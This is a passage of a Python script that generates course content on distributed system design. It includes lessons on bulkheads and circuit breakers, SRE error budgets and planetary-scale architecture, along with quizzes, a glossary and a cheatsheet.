                 "c": 0, "why": "Consumer lag measures how far behind workers are relative to incoming event production."},
                {"q": "How does asynchronous messaging improve user-perceived performance during checkout?",
                 "a": ["The order is accepted immediately and background tasks (sending emails, updating analytics) execute asynchronously after the user response", "It makes credit cards process faster", "It eliminates taxes", "It makes products free"],
                 "c": 0, "why": "Decoupling secondary side effects allows the web server to respond immediately upon order creation."}
            ],
            "You know how to decouple microservices using Message Queues, Pub/Sub, and Apache Kafka event streams.",
            "Resilient Communication: Circuit Breakers, Bulkheads, and Backpressure", "Harden inter-service communication against cascading network failure."
        ),
        build_lesson(
            6, "resilient-communication-circuit-breakers-bulkheads", "Resilient Communication: Circuit Breakers, Bulkheads, and Backpressure", "Resilient Communication",
            "Cascading failure defense: Circuit Breakers, the Bulkhead pattern (thread pool isolation), rate limiting, and Backpressure flow control.",
            "What is the 'Bulkhead Pattern' in distributed systems architecture?",
            ["Isolating resources (like thread pools and connection pools) into discrete compartments so that the failure or exhaustion of one dependency cannot sink the entire ship", "A metal wall in a submarine", "A computer monitor stand", "A firewall rule"],
            0, "The Bulkhead pattern isolates resource pools so exhaustion in one dependency does not starve other services.",
            [
                "<p>In a ship, watertight bulkheads divide the hull into isolated compartments. If water punctures Compartment 1, only that compartment floods; the rest of the ship stays afloat. In distributed software, <strong>The Bulkhead Pattern prevents a slow dependency from sinking your entire backend</strong>.</p>",
                "<p>Three Pillars of <strong>Resilient Inter-Service Communication</strong>:</p>",
                "<ul><li><strong>1. The Bulkhead Pattern (Resource Pool Isolation):</strong> Don't share a single HTTP connection pool across all microservices! If the `RecommendationService` slows down to 10 seconds, it will consume all 100 threads in a shared pool, starving the critical `PaymentService`! Allocate dedicated, isolated thread pools per dependency: <code>payments: 50 threads; recommendations: 10 threads</code>.</li><li><strong>2. Circuit Breakers:</strong> Monitor dependency failure rates. If recommendations fail 5 times consecutively, trip the circuit breaker to OPEN! Return an empty list fallback in 1ms rather than waiting for 10-second timeouts.</li><li><strong>3. Backpressure Flow Control:</strong> When a consumer is overwhelmed by incoming messages, it signals the producer to slow down (rate throttle or TCP window reduction), preventing memory buffer overflows.</li></ul>",
                "<pre><code># The Bulkhead & Circuit Breaker Architecture:\n# Shared Pool (Vulnerable - Sinks the Ship):\n# [Incoming Requests] ──> [Shared 100 Thread Pool]\n#                             ├── 95 Threads stuck waiting for slow Recommendation API!\n#                             └── 5 Threads left for Payment API -> PAYMENTS FAIL! TOTAL OUTAGE!\n#\n# Bulkhead Isolation (Resilient - Compartmentalized):\n# [Incoming Requests] ──>\n#   ├── Dedicated Payment Pool (50 Threads) ──> [Payment API] (100% HEALTHY!)\n#   └── Dedicated Recommendation Pool (10 Threads + Circuit Breaker) (Isolated failure!)</code></pre>",
                "<div class=\"callout\"><p><strong>The Isolation Mandate:</strong> Never allow non-critical features (recommendations, analytics) to share thread pools or database connections with core transactional paths (checkout, authentication).</p></div>"
            ],
            "Shared Resource Pool vs Bulkhead Isolation", "Preventing cascading starvation",
            [
                {"title": "Shared Thread Pool (Fragile)", "lines": ["One slow dependency consumes all 100 threads", "Starves critical payment & login services", "Cascading failure crashes whole company"]},
                {"title": "Bulkhead Isolation (Resilient)", "lines": ["Dedicated thread pool per service", "Slow recommendation service exhausts only its 10 threads", "Payments and auth remain 100% operational!"]}
            ],
            "Backpressure Mechanics", "Flow control under overload",
            [
                {"title": "Unbounded Ingestion (Crash)", "lines": ["Fast producer floods slow consumer", "RAM fills up -> Out of Memory crash!"]},
                {"title": "Backpressure (Protected)", "lines": ["Consumer throttles producer flow rate", "Buffers remain bounded and stable"]}
            ],
            "Complete the resilient communication sentence",
            "The Bulkhead pattern prevents cascading system crashes by isolating thread and connection pools into discrete {1}, while circuit breakers trip to stop {2} timeouts.",
            [
                {"answer": "compartments", "hint": "Isolated resource pools", "options": ["compartments", "formatting", "licensing"]},
                {"answer": "cascading", "hint": "Spreading failure across dependencies", "options": ["cascading", "hardware", "monitors"]}
            ],
            [
                {"q": "What failure scenario occurs when microservices share a single unconstrained HTTP thread pool?",
                 "a": ["A single degraded downstream service consumes all available worker threads, starving healthy critical services and causing a complete application outage", "The computer processor speeds up", "Threads convert to processes", "The database deletes data"],
                 "c": 0, "why": "Shared thread pools allow a single slow dependency to exhaust resources for the entire application."},
                {"q": "How does the Bulkhead pattern protect mission-critical operations like payments?",
                 "a": ["By allocating a dedicated, reserved thread and connection pool for payments that cannot be consumed by secondary non-critical services", "By encrypting payments", "By making payments free", "By turning off the internet"],
                 "c": 0, "why": "Isolated resource pools guarantee that critical workflows retain dedicated capacity regardless of secondary service degradation."},
                {"q": "What is 'Backpressure' in distributed stream processing?",
                 "a": ["A mechanism where an overloaded consumer signals upstream producers to slow down their transmission rate, preventing memory buffer overflows", "Water pressure in cooling pipes", "Air pressure in a server room", "A network cable defect"],
                 "c": 0, "why": "Backpressure prevents fast producers from overwhelming slow consumers with unbounded memory buffering."},
                {"q": "What is an acceptable fallback response when a circuit breaker trips on a product recommendation service?",
                 "a": ["Return a pre-computed list of top-selling products or an empty list, allowing the main product page to render without delay", "Crash the user's browser", "Display an HTTP 500 error screen", "Log out the user"],
                 "c": 0, "why": "Degrading to static fallbacks keeps the primary user experience intact without waiting for timeouts."}
            ],
            "You know how to protect distributed architectures using Circuit Breakers, Bulkheads, and Backpressure.",
            "Monitoring, SLOs, and Incident Response in Production", "Measure reliability scientifically with SLIs, SLOs, and incident playbooks."
        ),
        build_lesson(
            7, "monitoring-slos-incident-response", "Monitoring, SLOs, and Incident Response in Production", "SLOs & Incident Response",
            "Site Reliability Engineering (SRE): Service Level Indicators (SLIs), Service Level Objectives (SLOs), Error Budgets, and incident playbooks.",
            "What is an 'Error Budget' in Site Reliability Engineering (SRE)?",
            ["The allowable amount of unreliability or downtime a service can experience over a period (e.g. 0.01% for 99.99% availability) before deployments must halt", "The amount of money paid to fix bugs", "A budget for buying new computers", "A fine paid to customers"],
            0, "An error budget defines allowable unreliability, balancing rapid feature deployment against system stability.",
            [
                "<p>100% uptime is the wrong target: it is astronomically expensive and paralyzes engineering innovation. Site Reliability Engineering (SRE), pioneered by Google, replaces perfectionism with <strong>Service Level Objectives (SLOs) and Error Budgets</strong>.</p>",
                "<p>The SRE Trinity of Reliability Metrics:</p>",
                "<ul><li><strong>1. Service Level Indicator (SLI):</strong> A quantifiable measure of service performance. E.g. <em>'The percentage of HTTP requests returning status &lt; 500 in under 200ms over 30 days.'</em></li><li><strong>2. Service Level Objective (SLO):</strong> The target reliability goal agreed upon by engineering and product: <code>SLO = 99.9%</code> (three nines allows 43 minutes of downtime per month).</li><li><strong>3. Error Budget ($100\\% - \\text{SLO}$):</strong> The allowable downtime cushion ($0.1\\% = 43\\text{ minutes}$). If you have error budget left, deploy features rapidly! <strong>If error budget is exhausted, freeze feature deployments and focus 100% on reliability engineering!</strong></li><li><strong>4. Incident Response Playbooks:</strong> Clear, step-by-step diagnostic runbooks. When PagerDuty triggers an alert at 2 AM, the on-call engineer follows a verified runbook rather than guessing under stress.</li></ul>",
                "<pre><code># The SRE Error Budget Policy:\n# SLO Target: 99.9% Uptime over rolling 30 days\n# Error Budget: 0.1% (43 minutes of allowable failure)\n#\n# Scenario A: 10 minutes used this month (33 mins remaining) -> Ship features boldly!\n# Scenario B: 45 minutes used this month (BUDGET BREACHED!)   -> Feature freeze engaged!\n#             All engineering sprints redirect to automated tests, circuit breakers, & infra!</code></pre>",
                "<div class=\"callout\"><p><strong>The Blameless Post-Mortem:</strong> After an outage, never blame human error. Humans make mistakes. Fix the underlying tooling, safeguards, and automated tests so that identical human mistakes cannot cause an outage again.</p></div>"
            ],
            "The SRE Reliability Trinity", "SLI -> SLO -> Error Budget",
            [
                {"title": "1. SLI (Measurement)", "lines": ["Real-world metric: % of requests < 200ms", "Quantitative telemetry from Datadog"]},
                {"title": "2. SLO (Target)", "lines": ["Agreed reliability target: 99.9% availability", "Contract between Product and Engineering"]},
                {"title": "3. Error Budget (Cushion)", "lines": ["Allowable failure: 0.1% (43 mins/mo)", "Balances feature velocity with stability"]}
            ],
            "The Error Budget Policy", "Balancing innovation and reliability",
            [
                {"title": "Budget Remaining (Green)", "lines": ["Ship fast, innovate, take calculated risks"]},
                {"title": "Budget Exhausted (Red)", "lines": ["Deployment freeze! 100% focus on reliability"]}
            ],
            "Complete the SRE sentence",
            "Site Reliability Engineering balances feature velocity against system stability by measuring Service Level {1} against target SLOs and tracking remaining {2} budgets.",
            [
                {"answer": "Indicators", "hint": "SLIs — quantitative performance metrics", "options": ["Indicators", "Formatters", "Compilers"]},
                {"answer": "error", "hint": "Allowable failure allowance (100% - SLO)", "options": ["error", "hardware", "licensing"]}
            ],
            [
                {"q": "What is the primary purpose of an 'Error Budget' in Site Reliability Engineering?",
                 "a": ["To establish an agreed mathematical threshold that balances shipping new features quickly against maintaining system stability", "To pay developers overtime", "To buy backup servers", "To calculate customer refunds"],
                 "c": 0, "why": "Error budgets provide an objective governance mechanism balancing development velocity and reliability."},
                {"q": "What should an engineering team do when its service exhausts its monthly Error Budget?",
                 "a": ["Halt new feature deployments and dedicate engineering capacity exclusively to fixing reliability defects and automated tests", "Fire the on-call engineer", "Increase the error budget to 100%", "Delete the monitoring dashboard"],
                 "c": 0, "why": "Exhausted error budgets trigger feature freezes to prioritize stability and prevent outages."},
                {"q": "What is a 'Blameless Post-Mortem' following a production outage?",
                 "a": ["A retrospective analysis focused on identifying systemic architectural and process flaws rather than punishing individuals", "A meeting where nobody speaks", "A legal deposition", "A performance review"],
                 "c": 0, "why": "Blameless post-mortems build psychological safety, focusing on systemic defenses rather than individual blame."},
                {"q": "What is an 'Incident Runbook' (Playbook) used for in production operations?",
                 "a": ["A documented, step-by-step troubleshooting guide that on-call engineers follow during specific alert incidents to restore service quickly", "A book of programming jokes", "An employee contract", "A marketing brochure"],
                 "c": 0, "why": "Runbooks provide clear, tested procedures for rapid incident remediation under operational stress."}
            ],
            "You know how to define SLIs, set realistic SLOs, manage error budgets, and run blameless incident response post-mortems.",
            "Designing a Planetary-Scale Distributed System End-to-End", "Synthesize the entire 100-course curriculum: architect a planetary-scale system from scratch."
        ),
        build_lesson(
            8, "designing-planetary-scale-system-end-to-end", "Designing a Planetary-Scale Distributed System End-to-End", "Planetary System Design",
            "The ultimate architectural synthesis: designing a global, multi-region, 100M DAU distributed platform from scratch with complete defense in depth.",
            "What distinguishes an elite, planetary-scale system architecture from a standard web application?",
            ["End-to-end resilience: global Anycast CDN, multi-region active-active replication, consistent hashing, decoupled message streams, circuit breakers, and zero-trust security", "Having the fastest processor on earth", "Writing all software in one single file", "A system that has no users"],
            0, "Planetary-scale systems unify global edge routing, multi-region replication, consistent hashing, decoupled streams, and zero-trust security.",
            [
                "<p><strong>Congratulations! You have reached Lesson 8 of Course 100 — the final lesson of the Concept Lab curriculum.</strong></p>",
                "<p>Over 100 courses and 800 lessons, you have mastered the entire craft of modern computer science and software engineering: from binary bits, memory layouts, and algorithms, to web backends, databases, AI prompt engineering, autonomous multi-agent systems, cybersecurity, containerization, and distributed systems.</p>",
                "<p>Now, we synthesize every lesson into the <strong>Ultimate Planetary-Scale Distributed Architecture</strong> (Designing a Global Social & AI Platform for 100 Million Active Users):</p>",
                "<ul><li><strong>1. Global Edge Ingress Tier:</strong> Anycast DNS (Route 53) routes to 200+ Cloudflare/CloudFront CDN edge PoPs. Terminates TLS in 10ms, serves 85% of static assets and cached reads from edge memory. WAF blocks DDoS and prompt injections at the perimeter!</li><li><strong>2. Decoupled Ingress & API Gateway:</strong> Reverse proxy enforces JWT authentication, tenant rate limiting (Token Bucket in Redis), and PII scrubbing. Dispatches interactive chat to SSE streaming and long workflows to async job queues.</li><li><strong>3. Multi-Region Active Compute (Kubernetes / EKS):</strong> Hardened non-root containers orchestrated across Multi-AZ Kubernetes clusters in US, Europe, and Asia. Autoscaled via KEDA event metrics.</li><li><strong>4. Horizontally Partitioned Data Tier:</strong> High-throughput key lookups partitioned across a Consistent Hashing ring in DynamoDB/Cassandra. Core financial transactions run on PostgreSQL with Multi-AZ failover and read replicas.</li><li><strong>5. Resilient Event Streaming (Apache Kafka):</strong> Asynchronous event stream handles clickstreams and analytics at 100,000 events/sec. Sagas coordinate distributed transactions with compensating rollbacks.</li><li><strong>6. Telemetry & Reliability Governance:</strong> Full OpenTelemetry tracing to self-hosted Langfuse/Datadog. Multi-provider circuit breakers guarantee 99.999% uptime. Monitored against SRE SLOs with automated chaos testing.</li></ul>",
                "<pre><code># THE PLANETARY-SCALE DISTRIBUTED ARCHITECTURE MASTER BLUEPRINT:\n# [100 Million Global Clients]\n#             │\n#             ▼ (Anycast DNS)\n# [Global CDN & WAF Edge PoPs] ──(85% Cached Reads & Static Assets Absorbed!)\n#             │ (15% Dynamic API Calls)\n#             ▼\n# [Multi-Region API Gateways (Envoy / LiteLLM Proxy)]\n#       ├── Ingress Guardrails (PII Scrubbing, Rate Limiting, JWT Auth)\n#       ├── Path A: Real-Time Token Streaming Proxy (SSE, TTFT < 200ms)\n#       └── Path B: Decoupled Async Message Bus (Kafka / BullMQ)\n#             │\n#             ▼\n# [Stateless Microservices (Multi-AZ Kubernetes Clusters)]\n#       ├── Bulkhead Thread Pools & Multi-Provider Circuit Breakers\n#       ├── Semantic Vector Cache (Redis, 15ms Sub-Cent Hit Rate)\n#       └── Consistent Hashing Partition Ring (DynamoDB / Cassandra)\n#             │\n#             ▼\n# [Storage, Coordination & Telemetry Tier]\n#       ├── etcd Raft Consensus Cluster (CP Cluster State Governance)\n#       ├── PostgreSQL Multi-AZ Synchronous DB (ACID Core Ledger)\n#       ├── Immutable S3 Glacier Archive (WORM Forensic Audit Trail)\n#       └── OpenTelemetry Tracing & SRE SLO Error Budget Monitoring</code></pre>",
                "<div class=\"callout\"><p><strong>The Architect's Milestone:</strong> You have completed the 100-course Concept Lab journey. You now possess the deep theoretical foundations and battle-tested practical craftsmanship to design, build, and lead world-class software and AI systems at any scale.</p></div>"
            ],
            "The Planetary-Scale Architecture Blueprint", "The culmination of the 100-course curriculum",
            [
                {"title": "1. Global Edge Ingress", "lines": ["Anycast DNS + 200 CDN PoPs", "85% static traffic absorbed at edge"]},
                {"title": "2. Decoupled Ingress", "lines": ["JWT Auth, Rate Limiting, PII Scrubbing", "SSE streaming + Async Kafka queue"]},
                {"title": "3. Multi-Region Compute", "lines": ["Multi-AZ Kubernetes, non-root containers", "Autoscaled via KEDA event metrics"]},
                {"title": "4. Distributed Persistence", "lines": ["Consistent Hashing Ring (Cassandra)", "Multi-AZ Postgres + S3 Glacier WORM"]},
                {"title": "5. Reliability & Governance", "lines": ["Raft consensus, Circuit Breakers, SRE SLOs", "OpenTelemetry tracing & five-nines uptime"]}
            ],
            "The Complete Curriculum Journey", "From first principles to planetary mastery",
            [
                {"title": "Foundations (Tiers 1-4)", "lines": ["Bits, Memory, Logic, OOP, Data Structures, Algorithms"]},
                {"title": "Systems & AI (Tiers 5-8)", "lines": ["Databases, APIs, LLMs, RAG, Agents, Multi-Agent Systems"]},
                {"title": "Production & Security (Tiers 9-10)", "lines": ["Observability, Guardrails, Containers, CI/CD, Distributed Systems"]}
            ],
            "Complete the planetary system design sentence",
            "Planetary-scale system architecture synthesizes global edge routing, stateless microservices, consistent hashing, and {1} consensus into an unbreakable {2} platform.",
            [
                {"answer": "Raft", "hint": "Distributed consensus protocol", "options": ["Raft", "HTML", "CSS"]},
                {"answer": "distributed", "hint": "Multi-node resilient infrastructure", "options": ["distributed", "formatting", "licensing"]}
            ],
            [
                {"q": "What is the primary role of the CDN edge layer in a system serving 100 million daily active users?",
                 "a": ["Terminating TLS and absorbing the vast majority of static asset and cached read requests close to users, shielding origin servers from massive load", "Mining cryptocurrency", "Running user Python scripts", "Editing database schemas"],
                 "c": 0, "why": "Edge caching absorbs 80-90% of global web requests, protecting origin infrastructure from overload."},
                {"q": "How does combining consistent hashing, multi-AZ database replication, and circuit breakers guarantee high availability?",
                 "a": ["Consistent hashing distributes load uniformly, multi-AZ replication survives physical data center fires, and circuit breakers halt cascading failures", "It makes servers run without electricity", "It deletes all bugs", "It writes code automatically"],
                 "c": 0, "why": "These three layers together prevent hotspots, survive hardware failures, and stop cascading outages."},
                {"q": "Why is asynchronous event streaming (Kafka) critical for decouple services in a high-volume social or financial platform?",
                 "a": ["It allows transactions to execute in milliseconds without blocking on slow secondary services (notifications, analytics, indexing)", "Kafka makes computers faster", "Kafka replaces databases", "Kafka is required by law"],
                 "c": 0, "why": "Decoupling secondary processing ensures user-facing transactions complete with sub-second responsiveness."},
                {"q": "What is the final, ultimate takeaway from the entire 100-course Concept Lab curriculum?",
                 "a": ["Mastery of software engineering is the ability to break complex problems into decoupled, observable, reliable, and mathematically sound components that stand the test of time", "Using the largest model for every task", "Writing code without testing", "Memorizing syntax instead of principles"],
                 "c": 0, "why": "Mastery of software and AI engineering lies in deep first-principles understanding, decoupled architecture, and disciplined reliability."}
            ],
            "Congratulations! You have completed the final course of the Concept Lab curriculum. You have mastered System Design from Idea to Production.",
            "Curriculum Complete: 100 Courses Mastered", "You have achieved full mastery across Computer Science, AI Engineering, Cybersecurity, and Distributed Systems."
        )
    ]

    glossary = [
        {"id": "framework-scale", "title": "Framework & Scale", "terms": [
            {"term": "System Design", "def": "The process of defining architecture, components, modules, interfaces, and data for a system to satisfy specified requirements.", "lesson": 1, "tags": ["design", "architecture"]},
            {"term": "Back-of-the-Envelope Math", "def": "Rapid mathematical estimations of QPS, storage capacity, and bandwidth using foundational constants.", "lesson": 1, "tags": ["estimation", "math"]},
            {"term": "Non-Functional Requirements", "def": "System operational qualities such as latency, availability, fault tolerance, consistency, and security.", "lesson": 1, "tags": ["requirements", "sla"]}
        ]},
        {"id": "infrastructure-storage", "title": "Infrastructure & Storage", "terms": [
            {"term": "Stateless Architecture", "def": "Designing application servers to hold zero session state in local memory, enabling horizontal scale-out.", "lesson": 2, "tags": ["scaling", "stateless"]},
            {"term": "Database Sharding", "def": "Partitioning a database horizontally across multiple physical servers using a high-cardinality shard key.", "lesson": 3, "tags": ["databases", "sharding"]},
            {"term": "Hot Shard", "def": "A single database partition overwhelmed by traffic due to an unevenly distributed shard key.", "lesson": 3, "tags": ["databases", "pitfalls"]}
        ]},
        {"id": "caching-messaging", "title": "Caching & Messaging", "terms": [
            {"term": "Cache-Aside", "def": "A caching pattern querying cache first, lazily loading data from the database on miss, and evicting on write.", "lesson": 4, "tags": ["caching", "patterns"]},
            {"term": "Apache Kafka", "def": "A distributed, partitioned, append-only commit log platform optimized for high-throughput event streaming.", "lesson": 5, "tags": ["messaging", "kafka"]},
            {"term": "Bulkhead Pattern", "def": "Isolating thread and connection pools into discrete compartments so failure in one cannot sink the system.", "lesson": 6, "tags": ["resilience", "patterns"]}
        ]},
        {"id": "sre-synthesis", "title": "SRE & Planetary Scale", "terms": [
            {"term": "Service Level Objective", "def": "A target reliability goal (e.g. 99.9% uptime) agreed upon by engineering and product teams (SLO).", "lesson": 7, "tags": ["sre", "metrics"]},
            {"term": "Error Budget", "def": "The allowable margin of failure (100% - SLO) used to balance rapid feature deployment against stability.", "lesson": 7, "tags": ["sre", "governance"]},
            {"term": "Planetary-Scale Architecture", "def": "A distributed system architecture combining global Anycast CDNs, multi-region replication, and zero-trust security.", "lesson": 8, "tags": ["architecture", "planetary"]}
        ]}
    ]

    cheatsheet = [
        {
            "title": "Back-of-the-Envelope QPS & Storage Formulas",
            "label": "Universal system design constants",
            "code": "# 1 Day = 86,400 seconds (Approx 100k for mental math)\n# QPS = Total Daily Requests / 86,400\n# Peak QPS = Average QPS * 2 (or * 3 for surges)\n# Storage/Year = Daily Requests * Size_per_Request * 365",
            "lessonN": 1, "lessonSlug": "the-system-design-framework-scale-estimation", "lessonTitle": "The System Design Framework: Requirements, Scale, and Estimation"
        },
        {
            "title": "Cache-Aside with Explicit Invalidation",
            "label": "Safe high-throughput caching pattern",
            "code": "async def get_user(uid):\n    cached = await redis.get(f'user:{uid}')\n    if cached: return json.loads(cached)\n    data = await db.fetch_user(uid)\n    await redis.set(f'user:{uid}', json.dumps(data), ex=3600)\n    return data\n\nasync def update_user(uid, updates):\n    await db.update_user(uid, updates)\n    await redis.delete(f'user:{uid}') # Invalidate immediately!",
            "lessonN": 4, "lessonSlug": "caching-strategies-invalidation-patterns", "lessonTitle": "Caching Strategies: Read-Through, Write-Behind, and Cache Invalidation"
        },
        {
            "title": "SRE Error Budget Calculation",
            "label": "Permissible monthly downtime formula",
            "code": "# 99.9% Availability (Three Nines):\n# Error Budget = 0.1% = 43.8 minutes of downtime / month\n# 99.99% Availability (Four Nines):\n# Error Budget = 0.01% = 4.38 minutes of downtime / month\n# 99.999% Availability (Five Nines):\n# Error Budget = 0.001% = 26 seconds of downtime / month",
            "lessonN": 7, "lessonSlug": "monitoring-slos-incident-response", "lessonTitle": "Monitoring, SLOs, and Incident Response in Production"
        },
        {
            "title": "Planetary System Design Invariants",
            "label": "Core principles of high-scale systems",
            "code": "# 1. Stateless App Nodes -> Scales horizontally with load balancers\n# 2. Multi-AZ Everything -> Survives datacenter physical destruction\n# 3. Cache-Aside + Redis -> Sub-millisecond reads, shields database\n# 4. Asynchronous Queues  -> Decouples slow tasks, fast 40ms user response\n# 5. Circuit Breakers    -> Halts cascading failures under stress",
            "lessonN": 8, "lessonSlug": "designing-planetary-scale-system-end-to-end", "lessonTitle": "Designing a Planetary-Scale Distributed System End-to-End"
        }
    ]

    course_data = {
        "id": "system-design",
        "title": "System Design: From Idea to Production",
        "num": 100,
        "emoji": "🧭",
        "desc": "Caching, queues, sharding and trade-offs — designing a system end to end and defending the choices.",
        "topics": ["System Design", "Requirements Scoping", "Back-of-the-Envelope", "Stateless Architecture", "Database Sharding", "Caching Strategies", "Apache Kafka", "Bulkheads", "SRE & SLOs", "Planetary Scale"],
        "mission": "# Mission — System Design: From Idea to Production\n\nMaster the pinnacle of software engineering: designing planetary-scale distributed systems from scratch. Apply the 4-step system design framework, calculate back-of-the-envelope throughput and storage estimations, construct horizontally scalable stateless application tiers, scale databases using read replicas and horizontal sharding, design high-speed caching architectures with Cache-Aside and TTL invalidation, decouple microservices using asynchronous message queues and Apache Kafka, protect dependencies with Circuit Breakers and the Bulkhead pattern, manage reliability with SRE SLOs and error budgets, and architect planetary-scale systems handling 100 million active users.",
        "notes": "# Notes — System Design: From Idea to Production\n\nCourse 100 capstone. Always calculate Peak QPS and storage before picking databases. Stateless app tiers enable horizontal scale. Decouple services with Kafka, isolate resource pools with bulkheads, and govern with SRE error budgets.",
        "resources": "# Resources — System Design: From Idea to Production\n\n- Alex Xu, *System Design Interview – An Insider's Guide (Volumes 1 & 2)*\n- Martin Kleppmann, *Designing Data-Intensive Applications*\n- Google SRE Team, *Site Reliability Engineering: How Google Runs Production Systems*",
        "glossaryGroups": glossary,
        "cheatsheetSections": cheatsheet,
        "lessons": lessons
    }
    save_course(course_data)

if __name__ == "__main__":
    make_course_96()
    make_course_97()
    make_course_98()
    make_course_99()
    make_course_100()

